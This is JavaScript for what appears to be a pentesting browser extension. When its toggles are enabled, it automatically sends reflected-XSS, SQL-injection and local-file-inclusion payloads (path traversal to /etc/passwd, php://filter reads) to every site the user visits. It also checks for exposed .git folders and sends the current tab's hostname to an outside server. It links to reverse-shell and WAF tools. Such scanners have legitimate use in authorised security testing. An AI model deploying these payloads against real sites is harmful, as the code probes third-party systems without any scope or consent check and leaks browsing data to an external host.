document.addEventListener("DOMContentLoaded", function () {
    const GETURLIP = document.getElementById('GETURLIP')
    const git_button = document.getElementById("git")
    const reverse = document.getElementById("reverse")
    const XSS_button = document.getElementById("XSS_button")
    const SQLi_button = document.getElementById("SQLi")
    const wordpress_button = document.getElementById("wordpress")
    const WAF_button = document.getElementById("WAF")
    const decoder = document.getElementById("decoder")
    const XSS = document.getElementById("XSS")
    const param = document.getElementById("param")
    const LFI_button = document.getElementById("LFI")
    const subdomain = document.getElementById("subdomain")
    subdomain.addEventListener("click", (event) => {
        chrome.windows.create({
            url: chrome.runtime.getURL("subdomain.html"),
            type: "popup"
        },function (win) {

        })
    })
    XSS.addEventListener("click", (event) => {
        chrome.windows.create({
            url: chrome.runtime.getURL("XSS.html"),
            type: "popup"
        },function (win) {

        })
    })
    
    param.addEventListener("click", (event) => {
        chrome.windows.create({
            url: chrome.runtime.getURL("param.html"),
            type: "popup"
        },function (win) {

        })
    })
    // scanner.addEventListener("click", (event) => {
    //     chrome.windows.create({
    //         url: chrome.runtime.getURL("scanner.html"),
    //         type: "popup"
    //     },function (win) {

    //     })
    // })
    

    decoder.addEventListener("click", (event) => {
        chrome.windows.create({
            url: chrome.runtime.getURL("decoder.html"),
            type: "popup"
        },function (win) {

        })
    })


    
    WAF_button.addEventListener("click", (event) => {
        chrome.windows.create({
            url: chrome.runtime.getURL("WAF.html"),
            type: "popup"
        },function (win) {

        })
    })
    //wordpress 
    wordpress_button.addEventListener("click", (event) => {
        chrome.windows.create({
            url: chrome.runtime.getURL("wordpress.html"),
            type: "popup"
        }, function (win) {

        });
    })
    //reverse shell
    reverse.addEventListener("click", (event) => {
        chrome.windows.create({
            url: chrome.runtime.getURL("reverse.html"),
            type: "popup"
        }, function (win) {

        });

    })
    //GET IP
    GETURLIP.addEventListener("click", (event) => {

        chrome.tabs.query({
            active: true,
            lastFocusedWindow: true
        }, tabs => {
            let url = tabs[0].url;
            fetch(`http://at9w.eb2a.com/chrome/hostname.php?domain=${url.replace("http://","").replace("https://","").replace(/\/.*/ig,"")}`)
                .then(response => response.text())
                .then(data => {
                    document.getElementById("output").innerHTML = "output:"
                    document.getElementById("output2").innerHTML = data
                });
        });
    }, false)
    git_button.addEventListener("click", (event) => {
        let bool_git = document.getElementById("git").checked
        if (bool_git) chrome.storage.sync.set({
            "git": true
        });
        if (!bool_git) chrome.storage.sync.set({
            "git": false
        });
    }, false)
    chrome.storage.sync.get("git", function (data) {
        document.getElementById("git").checked = data.git;

    })
    LFI_button.addEventListener("click", (event) => {
        let bool_LFI = document.getElementById("LFI").checked
        if (bool_LFI) chrome.storage.sync.set({
            "LFI": true
        });
        if (!bool_LFI) chrome.storage.sync.set({
            "LFI": false
        });
    }, false)
    chrome.storage.sync.get("LFI", function (data) {
        document.getElementById("LFI").checked = data.LFI;

    })

    
    XSS_button.addEventListener("click", (event) => {
        let bool_XSS = document.getElementById("XSS_button").checked
        if (bool_XSS) chrome.storage.sync.set({
            "XSS": true
        });
        if (!bool_XSS) chrome.storage.sync.set({
            "XSS": false
        });
    }, false)

    chrome.storage.sync.get("XSS", function (data) {
        document.getElementById("XSS_button").checked = data.XSS;

    })
    SQLi_button.addEventListener("click", (event) => {
        let bool_SQLi = document.getElementById("SQLi").checked
        if (bool_SQLi) chrome.storage.sync.set({
            "SQLi": true
        });
        if (!bool_SQLi) chrome.storage.sync.set({
            "SQLi": false
        });
    }, false)

    chrome.storage.sync.get("SQLi", function (data) {
        document.getElementById("SQLi").checked = data.SQLi;

    })

});
function whitelist() {
    list = ["https://yandex.com/search/?text=","https://www.google.com/search?q=","https://duckduckgo.com/?q=","https://www.bing.com/search?q="]
    let domain = window.location
    for(i=0;i<list.length;i++){
        if(domain.toString().includes(list[i])) return true;

    }
}

// git test
window.addEventListener('load', (event) => {
    if(whitelist()) return;

    chrome.storage.sync.get("git", function (data) {
        if (data.git) {


            var getUrl = window.location;
            var baseUrl = getUrl.protocol + "//" + getUrl.host + "/" + getUrl.pathname.split('/')[0];
            fetch(baseUrl + '.git').then(response => response.text())
                .then(data => {
                    if (data.includes("Index of /.git")) {
                        alert(baseUrl + '.git')
                    }
                });
        }
    })
})

// XSS test (param)
window.addEventListener('load', (event) => {
    var regex
    if(whitelist()) return;


    chrome.storage.sync.get("XSS", function (data) {

        if (data.XSS) {

            var queryDict = {}
            location.search.substr(1).split("&").forEach(function (item) {
                queryDict[item.split("=")[0]] = item.split("=")[1]
            })
            var protocol = location.protocol;
            var slashes = protocol.concat("//");
            var host = slashes.concat(window.location.host);
            let last = host + window.location.pathname + "?"
            for (const par in queryDict) {
                last = last + `${par}=FUZZ&`

            }
            last = last.substring(0, last.length - 1)
            let payloads = ['x"><img src=sadad onerror=print()>', '<svg/onload=print()>', "<a onmouseover=print()>xxs link</a>"]

            let found = false
            for (let i = 0; i < payloads.length; i++) {
                regex = new RegExp(`value=${payloads[i]}`)
                fetch(last.replace(/FUZZ/g, payloads[i])).then(response => response.text())
                    .then(data => {
                        if (data.includes(payloads[i]) && !regex.test(data)) {
                            if (!found) {
                                found = true
                                alert("found XSS " + last.replace(/FUZZ/g, payloads[i]))
                            }
                        }

                    })

            }
        }

    })
})

//XSS (last url)
window.addEventListener('load', (event) => {
    if(whitelist()) return;

    chrome.storage.sync.get("XSS", function (data) {
        if (data.XSS) {
            var regex
            let payloads = ['x"><img src=sadad onerror=print()>', "<script>print()</script>", '<svg/onload=alert(1)>', "<a onmouseover=print()>xxs link</a>"]
            let found = false;
            const url = window.location.href
            for (let i = 0; i < payloads.length; i++) {
                fetch(url + payloads[i]).then(response => response.text())
                    .then(data => {
                        regex = new RegExp(`value=${payloads[i]}`)
                        if (data.includes(payloads[i]) && !regex.test(data)) {
                            if (!found) {
                                found = true
                                alert("found XSS " + url + payloads[i])
                            }

                        }
                    })

            }
        }
    })

})


//SQLi 
window.addEventListener('load', (event) => {
    if(whitelist()) return;

    chrome.storage.sync.get("SQLi", function (data) {
        if (data.SQLi) {

            var queryDict = {}
            location.search.substr(1).split("&").forEach(function (item) {
                queryDict[item.split("=")[0]] = item.split("=")[1]
            })
            var protocol = location.protocol;
            var slashes = protocol.concat("//");
            var host = slashes.concat(window.location.host);
            let last = host + window.location.pathname + "?"
            for (const par in queryDict) {
                // last = last + `${par}=${queryDict[par]}&`
                last = last + `${par}=${queryDict[par]}FUZZ&`

            }
            last = last.substring(0, last.length - 1)
            let payloads = ['\'', '\'\'', '\`', "\`\`", "\,", "//", "\\\\", "\\", "/", '\"\"', '\"', ";"]
            let found = false
            for (let i = 0; i < payloads.length; i++) {
                fetch(last.replace(/FUZZ/g, payloads[i])).then(response => response.text())
                    .then(data => {
                        if (/mysql_fetch_array|Warning.*?\\W(sqlite_|SQLite3::)|(Microsoft|System)\\.Data\\.SQLite\\.SQLiteException|SQLite\\.Exception|SQLite\/JDBCDriver|valid PostgreSQL result|PostgreSQL.*?ERROR|Warning.*?\\Wpg_|check the manual that (corresponds to|fits) your MariaDB server version|MySqlException|Pdo[./_\\\\]Mysql|MySqlClient\\.|Unknown column '[^ ]+' in 'field list'|check the manual that (corresponds to|fits) your MySQL server version|valid MySQL result|MySQLSyntaxErrorException|Warning.*?\\Wmysqli?_|SQL syntax.*?MySQL|mysqli_fetch_array/.exec(data)) {
                            if (!found) {
                                found = true
                                alert("found SQli " + last.replace(/FUZZ/g, payloads[i]))
                            }
                        }

                    })

            }
        }

    })
})

// bool SQLi test

window.addEventListener('load', (event) => {
    if(whitelist()) return;

    chrome.storage.sync.get("SQLi", function (data) {
        if (data.SQLi) {

            var queryDict = {}
            location.search.substr(1).split("&").forEach(function (item) {
                queryDict[item.split("=")[0]] = item.split("=")[1]
            })
            var protocol = location.protocol;
            var slashes = protocol.concat("//");
            var host = slashes.concat(window.location.host);
            let last = host + window.location.pathname + "?"
            for (const par in queryDict) {
                // last = last + `${par}=${queryDict[par]}&`
                last = last + `${par}=${queryDict[par]}FUZZ&`

            }
            if (last.includes("?=undefined")) return
            last = last.substring(0, last.length - 1)
            let payloads_or = [' or 12321=12321+--+', "\' or 12321=12321+--+", "\" or 12321=12321+--+"]
            let payloads_and = [" and 1232221=12321+--+", "\'and 1232221=12321+--+", "\" and 1232221=12321+--+"]
            let found = false

            for (let i = 0; i < payloads_or.length; i++) {
                fetch(last.replace(/FUZZ/g, payloads_or[i])).then(response => {
                    let data = response.status
                    for (let i = 0; i < payloads_and.length; i++) {
                        fetch(last.replace(/FUZZ/g, payloads_and[i])).then(response => {
                            if (data != response.status) { //check if response status equal to original response status
                                if (!found) {
                                    alert(`Found SQLi ${last.replace(/FUZZ/g,payloads_and[i])}`)
                                    found = true
                                }
                            }
                        })
                    }





                })

            }
        }
    })


});

//LFI
window.addEventListener('load', (event) => {
    if(whitelist()) return;
    chrome.storage.sync.get("LFI", function (data) {
        if (data.LFI) {
            var queryDict = {}
            location.search.substr(1).split("&").forEach(function (item) {
                queryDict[item.split("=")[0]] = item.split("=")[1]
            })
            var protocol = location.protocol;
            var slashes = protocol.concat("//");
            var host = slashes.concat(window.location.host);
            let last = host + window.location.pathname + "?"
            for (const par in queryDict) {
                // last = last + `${par}=${queryDict[par]}&`
                last = last + `${par}=${queryDict[par]}FUZZ&`

            }
            payloads =
            [
                '../../../../../../../../../../../../../../../../../../../../../etc/passwd',
                'php://filter/convert.base64-encode/resource=../../../../../etc/passwd',
                '/windows/system32/drivers/etc/hosts',

            ]
            for (let i = 0; i < payloads.length; i++) {
                fetch(last.replace(/FUZZ/g, payloads[i])).then(response => response.text())
                .then((response) => {
                    if(response.includes("root:x:0:0") || response.includes("127.0.0.1") && response.includes("localhost")) alert("LFI found: "+last.replace(/FUZZ/g, payloads[i])
                    
                    
                    
                    )
                })
                
            }
            
        }
    })

});

